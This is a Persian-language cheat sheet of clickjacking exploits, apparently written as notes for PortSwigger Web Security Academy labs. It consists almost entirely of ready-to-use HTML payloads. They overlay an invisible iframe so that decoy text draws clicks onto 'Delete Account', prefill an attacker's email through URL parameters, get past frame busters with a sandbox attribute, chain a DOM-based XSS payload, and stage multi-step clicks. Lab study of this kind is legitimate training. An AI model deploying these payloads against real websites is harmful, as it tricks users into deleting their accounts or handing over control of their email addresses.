# Clickjacking

## Exploit
- **حمله مقدماتی با حفاظت CSRF Token**
  - در کد زیر پیکسل ها را تغییر می دهیم تا متن *Click me* روی کلید *Delete Account* بیفند ، برای این کار باید ابتدا opacity را برابر 0.1 قرار دهیم و پس از بدست آوردن موقعیت درست، آن را روی 0.0001 تنظیم کنیم:
```HTML
<style>
   iframe {
       position:relative;
       width:700px;
       height: 500px;
       opacity: $opacity;
       z-index: 2;
   }
   div {
       position:absolute;
       top:300px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Test me</div>
<iframe src="https://ac721fc61e66ddc6c0325ed500ca00d4.web-security-academy.net/my-account"></iframe>
```
- **پر کردن خودکار فیلدهای فرم با استفاده از URL Param**
  - برای این منظور در کد فوق تگ iframe را به شکل زیر تغییر می دهیم:
```HTML
<iframe src="https://ac721fc61e66ddc6c0325ed500ca00d4.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
- **بای پاس کردن Frame Buster**
  - در اینحالت اجازه iframe کردن سایت قربانی را نخواهیم داشت، برای دور زدن این محافظت attribute زیر را به تگ iframe اضافه می کنیم:
```HTML
<iframe sandbox="allow-forms" src="https://ac1f1fd41fe93c54c00a5216000e009e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
``` 
- **ترکیب با DOM-based XSS**
  - در اینحالت payload عه XSS را درون فیلد Name قرار می دهیم:
```HTML
<iframe src="https://ac321fc21fb2c80cc035160b00f20003.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
- **کلیک چند مرحله ای**
  - در اینحالت پس از کلیک کاربر بر روی *Delete Account* یک سوال تائید به کاربر نمایش داده می شود و دو باره باید کلیک کند.
  - باید دو جا برای کلیک کاربر ایجاد کنیم و مشخص کنیم که با چه ترتیبی بر روی کلید های کلیک کند، که کد ان به صورت زیر خواهد بود:
```HTML
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:495px;
       left:50px;
       z-index: 1;
   }
   .secondClick {
       top:290px;
       left:210px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://ac221f9c1edf7ad8c03e127600c20051.web-security-academy.net/my-account"></iframe>
```
